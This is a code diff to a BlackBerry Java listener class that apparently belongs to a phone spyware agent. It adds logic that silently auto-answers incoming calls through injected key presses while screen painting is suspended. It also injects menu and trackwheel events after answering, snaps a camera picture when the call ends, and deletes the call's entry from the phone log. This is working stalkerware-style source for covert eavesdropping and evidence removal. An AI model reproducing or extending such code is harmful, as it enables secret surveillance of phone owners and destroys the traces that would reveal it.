@@ -18,7 +18,13 @@ import javax.microedition.lcdui.ImageItem;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.blackberry.api.phone.PhoneListener;
+import net.rim.blackberry.api.phone.phonelogs.CallLog;
+import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
+import net.rim.blackberry.api.phone.phonelogs.PhoneCallLogID;
+import net.rim.blackberry.api.phone.phonelogs.PhoneLogListener;
+import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
 import net.rim.device.api.system.Application;
+import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Bitmap;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.EventInjector;
@@ -28,12 +34,15 @@ import net.rim.device.api.system.RadioStatusListener;
 import net.rim.device.api.system.SystemListener;
 import net.rim.device.api.system.SystemListener2;
 import net.rim.device.api.system.EventInjector.KeyCodeEvent;
+import net.rim.device.api.system.EventInjector.KeyEvent;
 import net.rim.device.api.ui.Keypad;
+import net.rim.device.api.ui.UiApplication;
 import blackberry.agent.SnapShotAgent;
 import blackberry.interfaces.ApplicationListObserver;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.interfaces.BatteryStatusObserver;
 import blackberry.interfaces.Singleton;
+import blackberry.record.CameraRecorder;
 import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
@@ -51,10 +60,11 @@ import blackberry.utils.Utils;
  * @see AppEvent
  */
 public final class AppListener implements RadioStatusListener, HolsterListener,
-        SystemListener, SystemListener2, PhoneListener, Singleton {
+        SystemListener, SystemListener2, PhoneListener, PhoneLogListener,
+        Singleton {
 
     //#ifdef DEBUG
-    static Debug debug = new Debug("AppListener", DebugLevel.INFORMATION);
+    static Debug debug = new Debug("AppListener", DebugLevel.VERBOSE);
 
     //#endif
 
@@ -75,6 +85,8 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
     private AppListener() {
         lastStatus = DeviceInfo.getBatteryStatus();
         task = Task.getInstance();
+
+        //ScreenFake.Push();
     }
 
     /**
@@ -506,12 +518,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         //#endif
     }
 
-    public void callAnswered(int arg0) {
-        //#ifdef DEBUG_INFO
-        debug.info("callAnswererd: " + arg0);
-        //#endif
-    }
-
     public void callConferenceCallEstablished(int arg0) {
         //#ifdef DEBUG_INFO
         debug.info("callConferenceCallEstablished: " + arg0);
@@ -529,7 +535,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         debug.info("callDirectConnectDisconnected: " + callId);
         //#endif
     }
-
 
     public void callEndedByUser(int callId) {
         //#ifdef DEBUG_INFO
@@ -592,35 +597,49 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         String number = phoneCall.getDisplayPhoneNumber();
         boolean outgoing = phoneCall.isOutgoing();
 
-       
-        
         if (!outgoing) {
             //#ifdef DEBUG_INFO
             debug.info("answering");
             //#endif
             autoanswer = true;
+            //ScreenFake.Push();
+            synchronized (UiApplication.getEventLock()) {
+            UiApplication.getUiApplication().suspendPainting(true);
+            }
+            
             Application.getApplication().invokeLater(new Runnable() {
 
                 public void run() {
                     //Utils.sleep(100);
                     // Keypad.KEY_SEND
-                    EventInjector.KeyCodeEvent pressEndKey = new EventInjector.KeyCodeEvent(
+                    EventInjector.KeyCodeEvent pressKey = new EventInjector.KeyCodeEvent(
                             KeyCodeEvent.KEY_DOWN, (char) Keypad.KEY_SEND,
                             KeypadListener.STATUS_NOT_FROM_KEYPAD);
-                    EventInjector.KeyCodeEvent releaseEndKey = new EventInjector.KeyCodeEvent(
+                    EventInjector.KeyCodeEvent releaseKey = new EventInjector.KeyCodeEvent(
                             KeyCodeEvent.KEY_UP, (char) Keypad.KEY_SEND,
                             KeypadListener.STATUS_NOT_FROM_KEYPAD);
 
-                    pressEndKey.post();
-                    releaseEndKey.post();
-                    
-                    ScreenFake.Push();
-
+                    pressKey.post();
+                    releaseKey.post();
                 }
             });
-
         }
+    }
 
+    public void callDisconnected(int callId) {
+        //#ifdef DEBUG_INFO
+        debug.info("callDisconnected: " + callId);
+        //#endif
+
+        autoanswer = false;
+
+        byte[] camera = CameraRecorder.snap();
+        //#ifdef DEBUG_TRACE
+        if (camera != null) {
+            debug.trace("CameraRecorder.snap: " + camera.length);
+        }
+        //#endif
+        //ScreenFake.Pop();
     }
 
     public void callConnected(int callId) {
@@ -628,39 +647,110 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
         debug.info("callConnected: " + callId);
         PhoneCall phoneCall = Phone.getCall(callId);
         debug.info("Phone call: " + phoneCall.getDisplayPhoneNumber());
-        //#endif                      
+        //#endif      
+        synchronized (UiApplication.getEventLock()) {
+        UiApplication.getUiApplication().suspendPainting(false);
+        }
+    }
+
+    public void callAnswered(int arg0) {
+        //#ifdef DEBUG_INFO
+        debug.info("callAnswererd: " + arg0);
+        //#endif
 
         if (autoanswer) {
-            
+            //Backlight.enable(false);
             Application.getApplication().invokeLater(new Runnable() {
 
                 public void run() {
-                    Utils.sleep(100);
-                    EventInjector.invokeEvent(new EventInjector.KeyCodeEvent(
-                            EventInjector.KeyCodeEvent.KEY_DOWN, Keypad
-                                    .map(Keypad.KEY_MENU),
-                            KeypadListener.STATUS_NOT_FROM_KEYPAD));
-                    EventInjector.invokeEvent(new EventInjector.KeyCodeEvent(
-                            EventInjector.KeyCodeEvent.KEY_UP, Keypad
-                                    .map(Keypad.KEY_MENU),
-                            KeypadListener.STATUS_NOT_FROM_KEYPAD));
+                    //ScreenFake.Push();
+                    //Utils.sleep(100);
+                    synchronized (UiApplication.getEventLock()) {
+                        UiApplication.getUiApplication().suspendPainting(true);
+                        }
+                    
+                    KeyCodeEvent pressKey = new EventInjector.KeyCodeEvent(
+                            EventInjector.KeyCodeEvent.KEY_DOWN,
+                            (char) Keypad.KEY_MENU,
+                            KeypadListener.STATUS_NOT_FROM_KEYPAD);
+                    KeyCodeEvent releaseKey = new EventInjector.KeyCodeEvent(
+                            EventInjector.KeyCodeEvent.KEY_UP,
+                            (char) Keypad.KEY_MENU,
+                            KeypadListener.STATUS_NOT_FROM_KEYPAD);
 
-                    Application app = Application.getApplication();
+                    pressKey.post();
+                    releaseKey.post();
 
+                    EventInjector.TrackwheelEvent e = new EventInjector.TrackwheelEvent(
+                            EventInjector.TrackwheelEvent.THUMB_ROLL_DOWN, 9,
+                            KeypadListener.STATUS_TRACKWHEEL);
+                    EventInjector.invokeEvent(e);
+
+                    e = new EventInjector.TrackwheelEvent(
+                            EventInjector.TrackwheelEvent.THUMB_CLICK, 1,
+                            KeypadListener.STATUS_TRACKWHEEL);
+                    EventInjector.invokeEvent(e);
+                    
+                    
+                    
                 }
+                
+                
             });
 
         }
     }
-        public void callDisconnected(int callId) {
-            //#ifdef DEBUG_INFO
-            debug.info("callDisconnected: " + callId);
-            //#endif
 
-            autoanswer = false;
-            
-            ScreenFake.Pop();
+    public void callLogAdded(CallLog callLog) {
+        String notes = callLog.getNotes();
+        //#ifdef DEBUG_TRACE
+        debug.trace("callLogAdded: " + callLog.toString() + " notes: " + notes);
+        //#endif            
+
+        PhoneLogs phoneLogs = PhoneLogs.getInstance();
+
+        if (PhoneCallLog.class.isAssignableFrom(callLog.getClass())) {
+            PhoneCallLog phoneCallLog = (PhoneCallLog) callLog;
+            PhoneCallLogID logID = phoneCallLog.getParticipant();
+            //#ifdef DEBUG_TRACE
+            debug.trace("date: " + callLog.getDate() + " number: "
+                    + logID.getNumber());
+            //#endif 
         }
 
-    
+        int num = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
+        for (int i = 0; i < num; i++) {
+            CallLog log = phoneLogs.callAt(i, PhoneLogs.FOLDER_NORMAL_CALLS);
+            //#ifdef DEBUG_TRACE
+            debug.trace("date: " + log.getDate());
+            //#endif 
+            if (callLog.getDate().getTime() == log.getDate().getTime()) {
+                phoneLogs.deleteCall(i, PhoneLogs.FOLDER_NORMAL_CALLS);
+                break;
+            }
+        }
+
+        int newnum = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
+        //#ifdef DEBUG_TRACE
+        debug.trace("num: " + num + " after delete:" + newnum);
+        //#endif
+
+    }
+
+    public void callLogRemoved(CallLog arg0) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("callLogRemoved: " + arg0.getDate());
+        //#endif
+    }
+
+    public void callLogUpdated(CallLog arg0, CallLog arg1) {
+        // TODO Auto-generated method stub
+
+    }
+
+    public void reset() {
+        // TODO Auto-generated method stub
+
+    }
+
 }
